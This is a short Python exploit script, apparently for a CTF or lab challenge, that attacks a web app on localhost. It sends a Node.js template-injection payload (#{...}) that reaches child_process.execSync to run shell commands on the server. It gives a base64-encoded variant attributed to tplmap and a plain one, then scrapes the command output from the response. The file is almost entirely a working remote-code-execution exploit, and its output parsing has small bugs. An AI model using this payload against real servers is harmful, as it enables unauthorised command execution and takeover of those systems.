import requests
import re
from html.parser import HTMLParser
import base64

def sendPayload(payload_arg="me"):
    url = "http://127.0.0.1:5069/"
    result1 = requests.post(url,data={"name":payload_arg}).text
    return result1

#tplmap exploit 
command_to_execute = "ls"
command_b64_Encoded =base64.b64encode( command_to_execute.encode("utf-8") )
jscode = "global.process.mainModule.require('child_process').execSync(Buffer('%s', 'base64').toString())"%command_b64_Encoded
payload ='''#{%s}'''%jscode

#my exploit
jscode = "global.process.mainModule.require('child_process').execSync('ls').toString()"
payload ='''#{%s}'''%jscode

resutl = sendPayload(payload)
try:
    regex = r"<p>Hello([\s\S]*)</p>"
    matches = re.findall(regex,resutl)
    print (HTMLParser.HTMLParser().unescape(matches[0]))
except:
    print ("RESULT ERROR:\n"+resutl)







